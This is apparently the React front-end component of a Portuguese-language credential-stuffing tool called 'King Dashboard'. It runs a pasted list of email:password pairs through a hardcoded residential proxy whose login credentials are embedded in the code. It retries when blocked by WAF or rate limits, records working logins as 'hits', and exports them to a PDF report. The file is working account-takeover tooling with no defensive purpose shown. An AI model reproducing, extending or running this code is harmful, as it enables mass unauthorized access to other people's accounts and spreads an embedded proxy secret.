"use client";

import { useState, useRef, useEffect } from 'react';

interface LogEntry {
  id: string; // Mudado para string para comportar IDs únicos
  time: string;
  type: 'hit' | 'fail' | 'info' | 'error';
  message: string;
}

const FIXED_PROXY = '3ee54d1ec977870e6156:69cb68fe09fc14c6@gw.dataimpulse.com:823';

export default function CheckerModule({ initialCredentials, onCredentialsChange }: { initialCredentials?: string, onCredentialsChange?: (val: string) => void }) {
  const [credentials, setCredentials] = useState(initialCredentials || '');
  const [isRunning, setIsRunning] = useState(false);
  const isRunningRef = useRef(false);
  const [progress, setProgress] = useState({ current: 0, total: 0, hits: 0, fails: 0 });
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [hitsList, setHitsList] = useState<{user: string, pass: string}[]>([]); // New state for PDF export
  const logEndRef = useRef<HTMLDivElement>(null);

  // Sincroniza se o valor inicial mudar lá fora
  useEffect(() => {
    if (initialCredentials) setCredentials(initialCredentials);
  }, [initialCredentials]);

  const handleCredentialsChange = (val: string) => {
    setCredentials(val);
    onCredentialsChange?.(val);
  };

  const addLog = (type: LogEntry['type'], message: string) => {
    setLogs(prev => [...prev.slice(-100), {
      id: crypto.randomUUID(), // ID universalmente único gerado pelo navegador
      time: new Date().toLocaleTimeString(),
      type,
      message
    }]);
  };

  useEffect(() => {
    logEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [logs]);

  const startChecking = async () => {
    const credLines = credentials.split(/\r?\n/).filter(l => l.includes(':'));
    
    if (credLines.length === 0) return alert('Por favor, insira credenciais no formato email:senha');
    
    setIsRunning(true);
    isRunningRef.current = true;
    setProgress({ current: 0, total: credLines.length, hits: 0, fails: 0 });
    setLogs([]);
    setHitsList([]); // Reset hits for new run
    addLog('info', `Iniciando validação de ${credLines.length} contas...`);

    let hitCount = 0;
    let failCount = 0;

    for (let i = 0; i < credLines.length; i++) {
      if (!isRunningRef.current) break; // Agora o controle é feito via Ref

      const [username, password] = credLines[i].split(':').map(s => s.trim());
      const currentProxy = FIXED_PROXY;

      let retry = true;
      let retryCount = 0;
      const MAX_RETRIES = 3;

      while (retry && isRunningRef.current) {
        addLog('info', `Verificando: ${username}${retryCount > 0 ? ` (Tentativa ${retryCount + 1})` : ''}...`);

        try {
          const res = await fetch('/api/validate', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password, proxy: currentProxy })
          });

          // Se for erro de proxy/rede, tenta novamente até o limite
          if (res.status === 403 || res.status === 502 || res.status === 504 || res.status === 429) {
            retryCount++;
            if (retryCount < MAX_RETRIES) {
              addLog('error', `[PROXY/WAF ERRO] Status ${res.status}. Tentando novamente...`);
              await new Promise(resolve => setTimeout(resolve, 2000));
              continue;
            } else {
              addLog('fail', `[FALHA] ${username} - Limite de retentativas de proxy atingido.`);
              failCount++;
              retry = false;
              continue;
            }
          }

          const result = await res.json();

          if (result.success) {
            hitCount++;
            setHitsList(prev => [...prev, { user: username, pass: password }]);
            addLog('hit', `[SUCESSO] ${username}:${password}`);
            retry = false;
          } else {
            failCount++;
            const msg = result.message || result.error || 'Falha Desconhecida';
            addLog('fail', `[FALHA] ${username} - ${msg}`);
            retry = false;
          }
        } catch (err: any) {
          retryCount++;
          if (retryCount < MAX_RETRIES) {
            addLog('error', `[ERRO DE CONEXÃO] ${username} - Problema. Retentando...`);
            await new Promise(resolve => setTimeout(resolve, 2000));
          } else {
            addLog('fail', `[FALHA] ${username} - Erro crítico de conexão após ${MAX_RETRIES} tentativas.`);
            failCount++;
            retry = false;
          }
        }
      }

      setProgress(prev => ({ ...prev, current: i + 1, hits: hitCount, fails: failCount }));
      
      // Delay de respiro entre contas
      await new Promise(resolve => setTimeout(resolve, 1000));
    }

    addLog('info', 'Processo finalizado!');
    setIsRunning(false);
    isRunningRef.current = false;
  };

  const exportHitsToPDF = () => {
    if (hitsList.length === 0) return alert('Nenhum hit para exportar!');

    const printWindow = window.open('', '_blank');
    if (!printWindow) return alert('Por favor, permita pop-ups para gerar o PDF.');

    const html = `
      <html>
        <head>
          <title>Relatório de Hits - King Dashboard</title>
          <style>
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 40px; color: #333; }
            .header { border-bottom: 2px solid #6d28d9; margin-bottom: 30px; padding-bottom: 10px; display: flex; justify-content: space-between; align-items: flex-end; }
            h1 { color: #6d28d9; margin: 0; font-size: 24px; }
            .stats { font-size: 14px; color: #666; }
            table { width: 100%; border-collapse: collapse; margin-top: 20px; }
            th { background: #f3f4f6; text-align: left; padding: 12px; border-bottom: 1px solid #ddd; font-size: 13px; }
            td { padding: 10px; border-bottom: 1px solid #eee; font-size: 13px; font-family: monospace; }
            .footer { margin-top: 40px; font-size: 11px; color: #999; text-align: center; border-top: 1px solid #eee; padding-top: 20px; }
            @media print { .no-print { display: none; } }
          </style>
        </head>
        <body>
          <div class="header">
            <div>
              <h1>RELATÓRIO DE HITS</h1>
              <div class="stats">Premium Suite - King Dashboard</div>
            </div>
            <div style="text-align: right">
              <div class="stats">Data: ${new Date().toLocaleDateString('pt-BR')}</div>
              <div class="stats">Total: <strong>${hitsList.length} contas</strong></div>
            </div>
          </div>
          
          <table>
            <thead>
              <tr>
                <th style="width: 50%">Usuário/E-mail</th>
                <th style="width: 50%">Senha</th>
              </tr>
            </thead>
            <tbody>
              ${hitsList.map(h => `
                <tr>
                  <td>${h.user}</td>
                  <td>${h.pass}</td>
                </tr>
              `).join('')}
            </tbody>
          </table>

          <div class="footer">
            Relatório gerado automaticamente pelo King Dashboard - ${new Date().toLocaleString()}
          </div>
          
          <script>
            window.onload = () => {
              window.print();
              // window.close(); // Opcional: fechar após imprimir
            };
          </script>
        </body>
      </html>
    `;

    printWindow.document.write(html);
    printWindow.document.close();
  };

  return (
    <div style={{ display: 'grid', gridTemplateColumns: '350px 1fr', gap: '24px' }}>
      {/* Sidebar: Inputs & Stats */}
      <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
        <div className="glass-card">
          <h3 style={{ marginBottom: '16px', fontSize: '18px' }}>Configuração</h3>
          
          <label style={{ fontSize: '12px', opacity: 0.6, display: 'block', marginBottom: '8px' }}>Credenciais (user:pass)</label>
          <textarea 
            className="input-field" 
            style={{ height: '220px', fontSize: '11px', marginBottom: '20px' }}
            value={credentials}
            onChange={(e) => handleCredentialsChange(e.target.value)}
            disabled={isRunning}
          />

          <div style={{ marginBottom: '20px', padding: '12px', background: 'rgba(109, 40, 217, 0.1)', borderRadius: '8px', border: '1px solid rgba(109, 40, 217, 0.3)' }}>
            <p style={{ fontSize: '11px', opacity: 0.6, marginBottom: '4px' }}>Proxy Ativo:</p>
            <p style={{ fontSize: '12px', fontWeight: 'bold', color: 'var(--accent-primary)', wordBreak: 'break-all' }}>DataImpulse (Premium)</p>
          </div>

          <button 
            className="btn-primary" 
            style={{ width: '100%', marginBottom: '10px' }}
            onClick={startChecking}
            disabled={isRunning}
          >
            {isRunning ? 'Validando...' : '🛡️ Iniciar Validação'}
          </button>

          <button 
            className="btn-primary" 
            style={{ 
              width: '100%', 
              background: hitsList.length > 0 ? 'linear-gradient(135deg, #10b981, #059669)' : 'rgba(255,255,255,0.05)',
              color: hitsList.length > 0 ? 'white' : 'rgba(255,255,255,0.2)',
              cursor: hitsList.length > 0 ? 'pointer' : 'not-allowed',
              boxShadow: hitsList.length > 0 ? '0 4px 12px rgba(16, 185, 129, 0.2)' : 'none'
            }}
            onClick={exportHitsToPDF}
            disabled={isRunning || hitsList.length === 0}
          >
            📄 Exportar Hits ({hitsList.length})
          </button>
        </div>

        <div className="glass-card" style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px' }}>
          <div style={{ textAlign: 'center' }}>
            <p style={{ fontSize: '12px', opacity: 0.6 }}>Hits</p>
            <h4 style={{ fontSize: '24px', color: 'var(--success)' }}>{progress.hits}</h4>
          </div>
          <div style={{ textAlign: 'center' }}>
            <p style={{ fontSize: '12px', opacity: 0.6 }}>Fails</p>
            <h4 style={{ fontSize: '24px', color: 'var(--error)' }}>{progress.fails}</h4>
          </div>
          <div style={{ gridColumn: '1 / -1', marginTop: '12px' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '11px', marginBottom: '4px' }}>
              <span>Progresso</span>
              <span>{Math.round((progress.current / progress.total) * 100 || 0)}%</span>
            </div>
            <div style={{ width: '100%', height: '6px', background: 'rgba(255,255,255,0.1)', borderRadius: '10px', overflow: 'hidden' }}>
              <div style={{ 
                width: `${(progress.current / progress.total) * 100}%`, 
                height: '100%', 
                background: 'var(--accent-primary)',
                transition: 'width 0.3s ease'
              }} />
            </div>
          </div>
        </div>
      </div>

      {/* Main: Log Console */}
      <div className="glass-card" style={{ display: 'flex', flexDirection: 'column', height: '600px' }}>
        <h3 style={{ marginBottom: '16px', fontSize: '18px' }}>Console de Log</h3>
        <div style={{ 
          flex: 1, 
          background: 'rgba(0,0,0,0.4)', 
          borderRadius: '12px', 
          padding: '20px', 
          fontFamily: 'monospace', 
          fontSize: '13px', 
          overflowY: 'auto',
          border: '1px solid var(--border-color)'
        }}>
          {logs.length === 0 ? (
            <p style={{ opacity: 0.2, textAlign: 'center', marginTop: '200px' }}>Aguardando início...</p>
          ) : (
            logs.map(log => (
              <div key={log.id} style={{ marginBottom: '6px', borderBottom: '1px solid rgba(255,255,255,0.03)', paddingBottom: '4px' }}>
                <span style={{ opacity: 0.4, marginRight: '10px' }}>[{log.time}]</span>
                <span style={{ 
                  color: log.type === 'hit' ? 'var(--success)' : log.type === 'fail' ? 'var(--error)' : log.type === 'error' ? '#f87171' : 'var(--foreground)',
                  fontWeight: log.type === 'hit' ? 'bold' : 'normal'
                }}>
                  {log.message}
                </span>
              </div>
            ))
          )}
          <div ref={logEndRef} />
        </div>
      </div>
    </div>
  );
}
